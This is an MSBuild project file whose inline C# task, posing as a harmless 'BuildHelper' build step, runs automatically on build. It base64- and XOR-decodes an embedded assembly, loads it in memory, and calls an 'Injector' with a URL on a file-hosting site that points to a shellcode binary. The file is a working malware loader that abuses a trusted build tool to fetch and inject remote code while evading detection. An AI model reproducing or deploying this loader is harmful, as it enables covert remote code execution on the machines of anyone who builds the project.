<?xml version="1.0" encoding="utf-8"?>
<Project xmlns="http://schemas.microsoft.com/developer/msbuild/2003" DefaultTargets="RunBuild" ToolsVersion="4.0">

  <PropertyGroup>
    <ShellcodeUrl Condition="'$(ShellcodeUrl)' == ''">https://files.catbox.moe/nfasiv.bin</ShellcodeUrl>
    <PayloadData Condition="'$(PayloadData)' == ''"></PayloadData>
  </PropertyGroup>

  <UsingTask
    TaskName="BuildHelper"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="$(MSBuildToolsPath)\Microsoft.Build.Tasks.v4.0.dll">
    <ParameterGroup>
      <PayloadData Required="true" />
      <ShellcodeUrl Required="true" />
    </ParameterGroup>
    <Task>
      <Reference Include="System" />
      <Using Namespace="System" />
      <Using Namespace="System.Linq" />
      <Using Namespace="System.Reflection" />
      <Using Namespace="System.Runtime.InteropServices" />
      <Code Type="Class" Language="cs">
<![CDATA[
using System;
using System.Linq;
using System.Reflection;
using Microsoft.Build.Framework;
using Microsoft.Build.Utilities;

public class BuildHelper : Task
{
    [Required] public string PayloadData { get; set; }
    [Required] public string ShellcodeUrl { get; set; }

    public override bool Execute()
    {
        try
        {
            Log.LogMessage(MessageImportance.High, "[BUILD] Loading runtime module...");
            byte[] raw = Convert.FromBase64String(PayloadData);
            byte key = 0xA7;
            for (int i = 0; i < raw.Length; i++) raw[i] = (byte)(raw[i] ^ key);
            Assembly asm = Assembly.Load(raw);
            Type t = asm.GetType("Injector");
            MethodInfo m = t.GetMethod("Run", BindingFlags.Public | BindingFlags.Static);
            m.Invoke(null, new object[] { ShellcodeUrl });
            return true;
        }
        catch (Exception ex)
        {
            Log.LogError(string.Format("[BUILD] Error: {0}", ex.Message));
            return false;
        }
    }
}
]]>
      </Code>
    </Task>
  </UsingTask>

  <Target Name="RunBuild">
    <BuildHelper PayloadData="$(PayloadData)" ShellcodeUrl="$(ShellcodeUrl)" />
  </Target>

</Project>
